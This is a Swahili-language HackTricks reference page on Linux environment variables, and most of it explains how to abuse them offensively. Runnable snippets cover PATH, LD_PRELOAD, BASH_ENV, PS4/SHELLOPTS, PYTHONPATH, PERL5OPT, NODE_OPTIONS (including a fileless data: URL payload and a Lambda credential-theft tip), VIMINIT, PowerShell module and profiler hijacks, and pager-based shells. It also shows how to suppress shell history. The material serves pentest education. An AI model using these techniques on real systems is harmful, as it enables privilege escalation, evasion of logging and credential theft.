# Vigezo vya Mazingira vya Linux

{{#include ../../banners/hacktricks-training.md}}

## Vigezo vya kimataifa

Vigezo vya kimataifa **vitarithiwa** na **michakato tanzu**.

Unaweza kuunda kigezo cha kimataifa kwa kipindi chako cha sasa kwa kufanya:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Variable hii itapatikana katika sessions zako za sasa na michakato yake ya watoto.

Unaweza **kuondoa** variable kwa kufanya:

```bash
unset MYGLOBAL
```

## Vigezo vya ndani

**Vigezo vya ndani** vinaweza **kufikiwa** na **shell/script ya sasa** pekee.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Orodhesha vigezo vya sasa

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

Maudhui ya `/proc/*/environ` yametenganishwa kwa NUL, kwa hiyo njia hizi kwa kawaida ni rahisi kusoma:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

Ikiwa unatafuta **credentials** au **usanidi wa huduma unaovutia** ndani ya mazingira yaliyorithiwa, angalia pia [Linux Post Exploitation](../post-exploitation/README.md).

## Vigezo vya kawaida

Kutoka: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – display inayotumiwa na **X**. Kwa kawaida kigezo hiki huwekwa kuwa **:0.0**, kumaanisha display ya kwanza kwenye kompyuta ya sasa.
- **EDITOR** – kihariri cha maandishi anachopendelea mtumiaji.
- **HISTFILESIZE** – idadi ya juu zaidi ya mistari iliyo kwenye faili ya historia.
- **HISTSIZE** – Idadi ya mistari inayoongezwa kwenye faili ya historia mtumiaji anapomaliza session yake.
- **HOME** – saraka yako ya nyumbani.
- **HOSTNAME** – jina la kompyuta kwenye mtandao.
- **LANG** – lugha yako ya sasa.
- **MAIL** – mahali pa kuhifadhi barua za mtumiaji. Kwa kawaida ni **/var/spool/mail/USER**.
- **MANPATH** – orodha ya saraka za kutafuta kurasa za mwongozo.
- **OSTYPE** – aina ya mfumo wa uendeshaji.
- **PS1** – prompt chaguomsingi katika bash.
- **PATH** – huhifadhi njia za saraka zote zilizo na binary unazotaka kutekeleza kwa kubainisha tu jina la faili, badala ya njia ya jamaa au kamili.
- **PWD** – saraka ya sasa ya kufanya kazi.
- **SHELL** – njia ya command shell ya sasa (kwa mfano, **/bin/bash**).
- **TERM** – aina ya terminal ya sasa (kwa mfano, **xterm**).
- **TZ** – saa za eneo lako.
- **USER** – jina lako la mtumiaji la sasa.

## Vigezo vya kuvutia kwa hacking

Si kila kigezo kina manufaa sawa. Kwa mtazamo wa mashambulizi, weka kipaumbele kwa vigezo vinavyobadilisha **njia za utafutaji**, **faili za startup**, **tabia ya dynamic linker**, au **ukaguzi/uwekaji wa kumbukumbu**.

### **HISTFILESIZE**

**Badilisha thamani ya kigezo hiki iwe 0**, ili unapomaliza **session yako**, **faili ya historia** (\~/.bash_history) **ikate hadi mistari 0**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Badilisha **thamani ya kigezo hiki iwe 0**, ili amri **zisihifadhiwe kwenye historia iliyo kwenye kumbukumbu** na zisiandikwe tena kwenye **faili ya historia** (\~/.bash_history).

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

Ikiwa **thamani ya variable hii imewekwa kuwa `ignorespace` au `ignoreboth`**, command yoyote inayotanguliwa na nafasi ya ziada haitahifadhiwa kwenye history.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

Elekeza **history file** kwenye **`/dev/null`** au iondoe kabisa. Hii kwa kawaida inaaminika zaidi kuliko kubadilisha tu ukubwa wa history.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

Michakato itatumia **proxy** iliyotajwa hapa kuunganisha kwenye intaneti kupitia **http au https**.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: proxy chaguomsingi kwa zana/protokali zinazoitumia.
- `no_proxy`: orodha ya kupitisha (hosts/domains/CIDRs) zinazopaswa kuunganishwa moja kwa moja.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

Matoleo ya herufi ndogo na kubwa yanaweza kutumika kulingana na zana (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Michakato itaamini vyeti vilivyoonyeshwa kwenye **vigezo hivi vya mazingira**. Hii ni muhimu ili kufanya zana kama **`curl`**, **`git`**, wateja wa HTTP wa Python, au wasimamizi wa vifurushi waiamini CA inayodhibitiwa na mshambuliaji (kwa mfano, kufanya proxy ya interception ionekane halali).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Ikiwa wrapper/script yenye haki za juu itaendesha amri **bila kutumia absolute paths**, basi **directory ya kwanza katika `PATH` inayodhibitiwa na mshambuliaji** ndiyo itakayotumika. Hii ndiyo msingi wa **PATH hijacks** nyingi kwenye `sudo`, cron jobs, shell wrappers, na custom SUID helpers. Tafuta `env_keep+=PATH`, `secure_path` dhaifu, au wrappers zinazoita `tar`, `service`, `cp`, `python` n.k. kwa majina yake.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

Kwa minyororo kamili ya privilege-escalation inayotumia vibaya `PATH`, angalia [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` si rejea ya directory pekee: zana nyingi hupakia kiotomatiki **dotfiles**, **plugins**, na **usanidi wa kila mtumiaji** kutoka `$HOME` au `$XDG_CONFIG_HOME`. Ikiwa workflow yenye priviliji za juu itahifadhi thamani hizi, **config injection** inaweza kuwa rahisi zaidi.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Miongoni mwa targets zinazovutia ni `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py`, na faili mahususi za zana kama `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Vigezo hivi huathiri **dynamic linker**:

- `LD_PRELOAD`: lazimisha shared objects za ziada zipakiwe kwanza.
- `LD_LIBRARY_PATH`: weka directories za utafutaji wa library mwanzoni.
- `LD_AUDIT`: pakia auditor libraries zinazofuatilia upakiaji wa library na utatuzi wa symbol.

Vigezo hivi vina thamani kubwa sana kwa **hooking**, **instrumentation**, na **privilege escalation** ikiwa amri yenye upendeleo itavihifadhi. Katika hali ya **secure-execution** (`AT_SECURE`, kwa mfano setuid/setgid/capabilities), loader huondoa au kuzuia vingi vya vigezo hivi. Hata hivyo, hitilafu za parser katika hatua hiyo ya awali ya loader bado zina athari kubwa kwa sababu hutokea **kabla ya** programu lengwa.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` hubadilisha tabia ya glibc mapema (kwa mfano, allocator tunables) na ni muhimu sana katika exploit labs. Pia ni muhimu kwa mtazamo wa usalama kwa sababu **dynamic loader huichanganua mapema sana**. Hitilafu ya **Looney Tunables** ya 2023 ilikuwa ukumbusho mzuri kwamba environment variable moja inayochanganuliwa na loader inaweza kuwa **primitive ya local privilege-escalation** dhidi ya programu za SUID.<sup>[[6]](#references)</sup>

Kwa CVE-2023-4911, linganisha **toleo la kifurushi cha usambazaji kilichosakinishwa** na toleo lililorekebishwa la mtengenezaji wake, kisha uhakikishe loader inayotumiwa na michakato mipya. Kutegemea tu nambari ya toleo la upstream si salama: Debian iliweka parser iliyoathiriwa kwenye kifurushi chake cha 2.31, huku usambazaji mwingine ukiweka marekebisho bila kubadilisha nambari ya upstream. Mpito halisi wa privilege pia unahitaji target inayoweza kutekelezwa yenye privilege, ambayo mabadiliko ya utambulisho wake hayazuiwi na `NoNewPrivs`, mount ya `nosuid`, au mitigation nyingine. Epuka kuendesha crash probe yenye `GLIBC_TUNABLES` iliyoharibika wakati wa passive enumeration. Tazama [Ubuntu tracker](https://ubuntu.com/security/CVE-2023-4911), [Debian tracker](https://security-tracker.debian.org/tracker/CVE-2023-4911), na [Red Hat advisory](https://access.redhat.com/security/cve/cve-2023-4911) ili kujua kama inahusika kwa kila toleo; [security notice](https://ubuntu.com/security/notices/USN-6409-1) ya Ubuntu pia inahitaji kuwasha upya mfumo baada ya kusasisha.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

Ikiwa **Bash** imeanzishwa katika hali **isiyoingiliana**, hukagua `BASH_ENV` na kupakia faili hiyo kabla ya kuendesha script lengwa. Bash ikiitwa kama `sh`, au ikiwa katika hali ya mwingiliano ya mtindo wa POSIX, `ENV` pia inaweza kuchunguzwa. Hii ni njia ya kawaida ya kusababisha utekelezaji wa msimbo kupitia shell wrapper ikiwa mshambuliaji anaweza kudhibiti mazingira.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash hupuuza faili hizi za kuanzisha mfumo wakati **vitambulisho halisi na vyenye ufanisi vinatofautiana**; `-p` huhifadhi kitambulisho chenye ufanisi lakini haiwashi faili hizo za kuanzisha mfumo, kwa hiyo tabia halisi hutegemea jinsi wrapper inavyoanzisha shell. Kuwa makini na wrapper zenye upendeleo zinazotumia `setuid()`/`setgid()` **kabla** ya kuanzisha Bash: vitambulisho vinapolingana tena, Bash inaweza kuamini `BASH_ENV`, `ENV` na hali nyingine zinazohusiana na shell ambazo vinginevyo zingepuuzwa.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Bash inapokuwa na **xtrace** ikiwa imewashwa, hupanua `PS4` na kuichapisha kabla ya kila amri inayofuatiliwa. `PS4` hupanuliwa kama prompt, kwa hiyo **command substitution** iliyomo ndani yake hutekelezwa. Muhimu zaidi, xtrace inaweza kuwashwa moja kwa moja kupitia mazingira kwa ku-export `SHELLOPTS=xtrace` — hakuna haja ya kuweka `-x` kwenye mstari wa amri — kwa hiyo script yoyote ya Bash anayoendesha mwathiriwa huwa njia ya kutekeleza msimbo.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` haifanyi chochote hadi xtrace iwashwe (`SHELLOPTS=xtrace`, `set -x` au `bash -x`), na Bash huondoa `SHELLOPTS` katika mazingira yenye marupurupu/setuid kama inavyofanya kwa `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Vigezo hivi hubadilisha jinsi Python inavyoanza:

- `PYTHONPATH`: huongeza njia za utafutaji wa import mwanzoni.
- `PYTHONHOME`: huhamisha eneo la mti wa standard library.
- `PYTHONSTARTUP`: hutekeleza faili kabla ya kidokezo shirikishi.
- `PYTHONINSPECT=1`: huingia katika hali shirikishi baada ya script kumalizika.
- `PYTHONBREAKPOINT`: `package.module.callable` huitwa (na module yake kuingizwa) msimbo unapofikia `breakpoint()`.<sup>[[8]](#references)</sup>

Vinafaa dhidi ya scripts za matengenezo, debuggers, shells na wrappers zinazoita Python kwa mazingira yanayoweza kudhibitiwa. `python -E` na `python -I` hupuuza vigezo vyote vya `PYTHON*`.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Mfano wa hivi karibuni kutoka ulimwengu halisi ni LPE ya **needrestart** ya 2024 kwenye mifumo ya Ubuntu/Debian: scanner inayomilikiwa na root ilinakili `PYTHONPATH` ya mchakato usio na ruhusa kutoka `/proc/<PID>/environ`, kisha ikaendesha Python. Exploit iliyochapishwa iliweka `importlib/__init__.so` kwenye njia inayodhibitiwa na mshambuliaji, ili Python itekeleze msimbo wa mshambuliaji wakati wa uanzishaji wake, kabla hata script iliyowekwa moja kwa moja kwenye helper haijawa na umuhimu.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl ina vigezo vya uanzishaji vyenye manufaa sawa:

- `PERL5LIB`: huongeza saraka za maktaba mwanzoni mwa orodha.
- `PERL5OPT`: huingiza swichi kana kwamba zipo kwenye kila mstari wa amri wa `perl`.

Hii inaweza kulazimisha **upakiaji wa moduli kiotomatiki** au kubadilisha tabia ya interpreter kabla script lengwa haijafanya chochote muhimu. Perl hupuuza vigezo hivi katika miktadha ya **taint / setuid / setgid**, lakini bado vina umuhimu mkubwa kwa wrappers za kawaida zinazoendeshwa kama root, kazi za CI, installers na sheria maalum za sudoers.

Ikiwa sheria ya sudo inaruhusu ubadilishaji wa mazingira na amri yake yenye ruhusa za juu hatimaye inazindua Perl, kagua pia `PERL5DB`. Perl inaeleza kwamba `PERL5OPT=-d` huwasha debugger na kwamba `PERL5DB` hutoa msimbo wa kuanzisha debugger pale Perl inapoanza na swichi tupu ya `-d`. Kuondoa `PERL5LIB` na `PERLLIB` pekee hakuondoi njia hii. Vigezo hivyo lazima vipitie sudo na wrapper, na mchakato wa Perl usivipuuze kwa sababu ya ushughulikiaji wa taint au set-ID; kagua sheria husika na mnyororo wa utekelezaji bila kuendesha helper yenye ruhusa za juu wakati wa uchunguzi. Tazama [marejeleo ya vigezo vya mazingira ya perlrun](https://perldoc.perl.org/perlrun#ENVIRONMENT).

Njia ya utafutaji ya `@INC` iliyojengewa ndani ya Perl pia ni mpaka mwingine wa uaminifu wa moduli, hata bila vigezo vya mazingira vilivyohifadhiwa. Kwa mchakato wa Perl wenye ruhusa za juu, linganisha kauli halisi ya `use` au `require` na jina la moduli lililotatuliwa, mpangilio wa utafutaji, na uwezo wa mtumiaji mwenye ruhusa za chini kuunda au kubadilisha moduli hiyo kwenye saraka inayotafutwa. Saraka ya maktaba inayoweza kuandikwa pekee haithibitishi kwamba mchakato wenye ruhusa za juu utapakia msimbo kutoka humo.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` huongeza **bendera za CLI za Node.js** mwanzoni mwa kila mchakato wa `node` unaorithi mazingira hayo. Hii huifanya iwe muhimu dhidi ya wrappers, kazi za CI, visaidizi vya Electron, na sheria za sudo ambazo hatimaye huendesha Node. Bendera zinazovutia zaidi kwa madhumuni ya mashambulizi kwa kawaida ni:

- `--require <file>`: pakia mapema faili ya CommonJS kabla ya script lengwa.
- `--import <module>`: pakia mapema moduli ya ES kabla ya script lengwa.

Node hukataa baadhi ya bendera hatari katika `NODE_OPTIONS`, lakini `--require` na `--import` zinaruhusiwa waziwazi na hushughulikiwa **kabla** ya hoja za kawaida za mstari wa amri.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### Preload isiyotumia faili kwa URL ya `data:`

Unapoweza kuweka `NODE_OPTIONS` lakini **huwezi kuandika faili** kwenye lengo (mfumo wa faili wa kusoma pekee, API yenye vizuizi, runtime isiyo na seva, n.k.), `--import` hukubali URL ya `data:text/javascript,`, kwa hivyo payload nzima husafirishwa ndani ya kigezo cha mazingira chenyewe. JavaScript lazima iwe **imesimbwa kikamilifu kwa URL** — Node huchanganua thamani hiyo kama URL, kwa hivyo nafasi yoyote ghafi (au herufi nyingine yoyote ambayo haijasimbwa) hukatiza payload na kusababisha `SyntaxError`. Hii hufanya kazi kwenye Node 20.6+ ambapo `--import` iko kwenye orodha ya ruhusa ya `NODE_OPTIONS`.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> Hii ni njia ya kawaida ya kutumia udhibiti wa `NODE_OPTIONS` kupata RCE kwenye **managed cloud runtimes** ambazo functions zake huendesha Node. Kwa mfano, mshambulizi anayeweza kubadilisha tu usanidi wa Lambda (`lambda:UpdateFunctionConfiguration`, bila `iam:PassRole` au kusasisha code) anaweza kuingiza `NODE_OPTIONS=--import data:text/javascript,<payload>` ili kuendesha code ndani ya function na kuiba credentials za execution role yake. Module iliyoingizwa huendeshwa **kabla** ya handler, ambayo bado huendeshwa kawaida baadaye.

Kwa remote gadget chains zinazoweka `NODE_OPTIONS` kwa njia isiyo ya moja kwa moja (kwa mfano, prototype-pollution hadi RCE), angalia [ukurasa huu mwingine](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby hutoa aina hiyo hiyo ya matumizi mabaya wakati wa kuanza:

- `RUBYLIB`: tanguliza directories kwenye load path ya Ruby.
- `RUBYOPT`: ingiza command-line options kama `-r` kwenye kila mwito wa `ruby`.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

Udhaifu wa **needrestart** wa 2024 ulionyesha kuwa hii si ujanja wa maabara tu: helper huyo huyo anayemilikiwa na root aliyekuwa katika hatari ya kutumiwa vibaya kupitia `PYTHONPATH` angeweza pia kushawishiwa kuendesha Ruby kwa `RUBYLIB` inayodhibitiwa na mshambuliaji, na kupakia `enc/encdb.so` kutoka kwenye saraka ya mshambuliaji.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim hutekeleza amri za Ex zilizomo kwenye `VIMINIT` (au mbadala wake wa `EXINIT`) wakati wa uanzishaji wa kawaida. Amri za Ex zinajumuisha `:!cmd` na `:call system(...)`, kwa hiyo kudhibiti kigezo hiki kunaruhusu utekelezaji wa msimbo kila mwathiriwa anapofungua Vim (kama vile `sudo vim` inayotumia root, `crontab -e`, `visudo`, `git`/`less` zinazoanzisha `$EDITOR`, n.k.).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Hali ya batch (`vim -es`/`-Es`) huruka vigezo hivi, lakini uanzishaji wa kawaida wa mwingiliano huviendesha.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) huendeshwa kwenye Linux/macOS (na Windows) na ni **programu ya .NET**, hivyo vigezo kadhaa vya mazingira hugeuza mwito wowote wa `pwsh` unaorithi mazingira kuwa utekelezaji wa msimbo — muhimu kulenga kazi za cron/systemd, CI runners na wrappers zenye ruhusa za juu zinazoendesha `pwsh` kupitia shell.

- `PSModulePath`: PowerShell hutafuta kwa kurudia kila saraka katika orodha hii ili kupata modules za `.psd1`/`.psm1` na **hupakia kiotomatiki** moja mara ya kwanza amri inayotoa inapotajwa. Ongeza saraka mwanzoni mwa orodha, na msimbo wa kiwango cha juu wa module yako utaendeshwa wakati wa kuimport; kwa kuwa utatuzi hufuata mpangilio wa *Alias → Function → Cmdlet*, function inayotolewa inaweza hata kufunika cmdlet iliyojengewa ndani ambayo mwathiriwa anaita.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: huhamisha `powershell/Microsoft.PowerShell_profile.ps1`, ambayo huendeshwa wakati wa uanzishaji (isipokuwa `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: assembly inayodhibitiwa ambayo `StartupHook.Initialize()` yake huendeshwa kabla ya `Main` (hutumiwa na kila programu ya .NET).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: API ya profiling ya CLR hupakia library ya mshambuliaji kwenye process wakati wa uanzishaji (vigezo vya njia hushinda registry; `DOTNET_*` ndiyo alias mpya zaidi). Kwenye Windows PowerShell 5.1 (.NET Framework), tumia `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Kwenye Windows, `PSExecutionPolicyPreference=Bypass` pia huondoa kizuizi cha "unsigned scripts blocked", hivyo profile/module iliyopandikizwa huendeshwa. Tazama ukurasa maalum kwa PoC kamili:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Baadhi ya zana hazisomi tu njia kutoka kwenye mazingira; hupitisha thamani kwa **shell**, **editor**, au **input preprocessor**. Hii hufanya vigeu vifuatavyo vivutie hasa wakati wrapper yenye upendeleo inaendesha `git`, `man`, `less`, au vitazamaji vingine vya maandishi:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: huchagua amri ya pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: huchagua amri ya editor, mara nyingi ikiwa na arguments.
- `LESSOPEN`, `LESSCLOSE`: hufafanua pre/post-processors zinazoendeshwa `less` inapofungua faili.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git pia inasaidia **uingizaji wa usanidi kupitia mazingira pekee** bila kugusa diski kwa kutumia `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, na `GIT_CONFIG_VALUE_<n>`:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Kwa mtazamo wa post-exploitation, kumbuka pia kwamba mazingira yaliyorithiwa mara nyingi huwa na **credentials**, **mipangilio ya proxy**, **service tokens**, au **cloud keys**. Angalia [Linux Post Exploitation](../post-exploitation/README.md) kwa mbinu za kutafuta `/proc/<PID>/environ` na `Environment=` za `systemd`.

### PS1

Badilisha mwonekano wa prompt yako.

[**Huu ni mfano**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Huu ni mfano](<../images/image (897).png>)

Mtumiaji wa kawaida:

![PERL5OPT & PERL5LIB - PS1: Kazi moja, mbili na tatu zilizoendeshwa chinichini](<../images/image (740).png>)

Kazi moja, mbili na tatu zilizoendeshwa chinichini:

![PERL5OPT & PERL5LIB - PS1: Kazi moja, mbili na tatu zilizoendeshwa chinichini](<../images/image (145).png>)

Kazi moja chinichini, moja iliyosimamishwa, na amri ya mwisho haikukamilika ipasavyo:

![PERL5OPT & PERL5LIB - PS1: Kazi moja chinichini, moja iliyosimamishwa, na amri ya mwisho haikukamilika ipasavyo](<../images/image (715).png>)

## References

- [1] [Mwongozo wa GNU Bash - Faili za Kuanzisha Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPE katika needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Nyaraka za CLI za Node.js - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Vigezo vya kawaida vya mazingira - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Kuinua marupurupu ndani ya mfumo kupitia ld.so ya glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Mwongozo wa GNU Bash - Vigezo vya Bash (`PS4`) na Builtin ya Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - breakpoint() iliyojengewa ndani na PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Nyaraka za Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath na upakiaji otomatiki wa moduli za PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Mipangilio ya usanidi wa utatuzi na uchanganuzi wa utendaji ya .NET (vigezo vya profiler vya `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
